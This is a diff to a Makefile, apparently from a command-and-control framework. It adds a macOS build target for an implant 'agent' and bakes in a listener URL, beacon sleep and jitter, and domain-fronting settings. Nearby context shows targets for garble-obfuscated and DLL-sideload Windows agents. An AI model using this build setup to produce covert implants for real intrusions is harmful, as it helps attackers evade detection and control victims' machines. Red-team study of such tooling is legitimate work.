@@ -54,6 +54,21 @@ agent-linux: ## Cross-compile Linux/amd64 agent
 	  -o $(AGENT_DIR)/$(AGENT_BIN)_linux_amd64 ./cmd/agent
 	@echo "[+] Agent built: $(AGENT_DIR)/$(AGENT_BIN)_linux_amd64"
 
+.PHONY: agent-darwin
+agent-darwin: ## Cross-compile macOS/amd64 agent
+	@echo "[*] Building macOS/amd64 agent..."
+	@mkdir -p $(AGENT_DIR)
+	GOOS=darwin GOARCH=amd64 CGO_ENABLED=0 \
+	go build -ldflags "$(LDFLAGS) \
+	  -X '$(MODULE)/internal/implant.ListenerURL=$(LISTENER_URL)' \
+	  -X '$(MODULE)/internal/implant.SleepSeconds=$(SLEEP)' \
+	  -X '$(MODULE)/internal/implant.JitterPercent=$(JITTER)' \
+	  -X '$(MODULE)/internal/implant.ServerPubKey=$(SERVER_PUBKEY)' \
+	  -X '$(MODULE)/internal/implant.FrontDomain=$(FRONT_DOMAIN)' \
+	  -X '$(MODULE)/internal/implant.HostHeader=$(HOST_HEADER)'" \
+	  -o $(AGENT_DIR)/$(AGENT_BIN)_darwin_amd64 ./cmd/agent-darwin
+	@echo "[+] Agent built: $(AGENT_DIR)/$(AGENT_BIN)_darwin_amd64"
+
 .PHONY: agent-garble-windows
 agent-garble-windows: ## Obfuscated Windows agent via garble
 	@echo "[*] Building obfuscated Windows/amd64 agent..."
@@ -84,7 +99,7 @@ agent-dll: ## Cross-compile Windows DLL agent (rundll32/regsvr32/sideload)
 	@echo "[+] DLL built: $(AGENT_DIR)/$(AGENT_BIN)_windows_amd64.dll"
 
 .PHONY: agent-all
-agent-all: agent-windows agent-linux agent-dll ## Build all agent variants
+agent-all: agent-windows agent-linux agent-darwin agent-dll ## Build all agent variants
 
 # ──────────────── Utilities ─────────────
 
